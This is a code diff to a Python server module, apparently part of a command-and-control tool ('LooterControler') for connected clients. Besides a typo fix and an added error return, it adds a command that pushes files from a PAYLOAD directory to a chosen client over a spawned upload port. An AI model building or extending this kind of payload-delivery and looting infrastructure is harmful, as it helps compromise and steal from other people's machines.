@@ -36,7 +36,7 @@ class BasicControler:
             return
         client = self.server.Central.clients.get(cliID)
         if not client:
-            self.server.Msg(f"Client ID:{clID} is not connected")
+            self.server.Msg(f"Client ID:{cliID} is not connected")
             return
         client.sendMsg(message)
     
@@ -267,6 +267,7 @@ class LooterControler(BasicControler):
             flen = int(flen)
         except (ValueError, TypeError):
             self.server.Msg(f"[!!] ERROR: LOOTER recive file_len bad values: {flen} [!!]", dev=True)
+            return
         if dir_index:
             xtra = self._xtraServ(self.server, flen, fname, dir_index)
         else:
@@ -297,6 +298,19 @@ class LooterControler(BasicControler):
         cliInfo += info + "\n\n\n"
         cliInfo += handler.EnvVar
         return cliInfo
+    
+    def uploadFile(self, cliID: str, file_name: str) -> None:
+        if not self.server.is_listening:
+            self.server.Msg("[!!] ERROR: Server not listening [!!]")
+            return
+        fpath = os.path.join(self.server.config["PAYLOAD_DIR"], file_name)
+        if not os.path.exists(fpath):
+            self.server.Msg(f"[!!] ERROR: file name: {file_name} does not exists in PAYLOAD dir [!!]")
+            return
+        file_len = os.stat(fpath).st_size
+        xtra = self._xtraServ(server_callback=self.server, file_name=file_name, work="upload")
+        self.server.Tasker.addTask(name="Looter Uploader", func_name=xtra.START, info="Upload file threading", types="handlers")
+        self.sendMsg2Client(cliID, f"$$UPL$${str(xtra.port)}$${file_name}$${str(file_len)}")
         
         
 
@@ -319,3 +333,10 @@ class LooterControler(BasicControler):
                 self.prepareWorkplace(cmd[1], clinfo, cmd[3])
             case _:
                 self.server.Msg(f"[!!] WARNING ! Client id={handler.ID} addr: {handler.Addr} send unknown system message or try spoof you [!!]")
+    
+    def execCMD(self, cmd: list) -> None:
+        match cmd[0]:
+            case "up":
+                self.uploadFile(cmd[1], cmd[2])
+            case _:
+                self.server.Msg("Unknown Command")
